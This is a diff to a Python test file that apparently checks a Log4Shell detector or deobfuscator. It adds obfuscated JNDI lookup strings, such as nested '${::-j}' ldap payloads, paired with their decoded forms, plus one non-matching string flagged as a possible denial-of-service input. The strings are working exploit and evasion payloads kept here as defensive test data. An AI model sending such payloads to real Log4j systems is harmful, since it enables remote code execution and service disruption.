@@ -33,6 +33,10 @@ def test_deobfuscate(encoded, decoded):
          'ldap://127.0.0.1#evilhost.com:1389/a'),
         ('/foo?query=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com}',
          'ldap://example.com'),
+        ('${${::-${::-${::-j}}}ndi:ldap://example.com}',
+         'ldap://example.com'),
+        ('${${::-${::-$${::-j}}}ndi:ldap://example.com}',
+         'ldap://example.com'),
     ]
 )
 def test_strings(encoded, decoded):
@@ -61,6 +65,7 @@ def test_payloads(encoded, decoded):
         ('#!/bin/bash\n\nsomething=${MYVAR:-default}\n'),
         ('Dec 16 19:52:49 li-840c4dcf-0d4b-42ca-9a7e-2603c1ad2626 systemd[1]: fprintd.service: Succeeded.'),
         ('${${nCdl:xlKziH:B:HfDmcQ:-j}${BYkus:XmUteQ:-n}${gN:NI:-d}${sLUUc:fh:eIw:-i}${XWAhx:gtd:-:}'),  # Incomplete
+        ('${${::-${::-$${::-j}}}}'),  # Not log4shell, though apparently can cause DoS?
     ]
 )
 def test_negaives(payload):
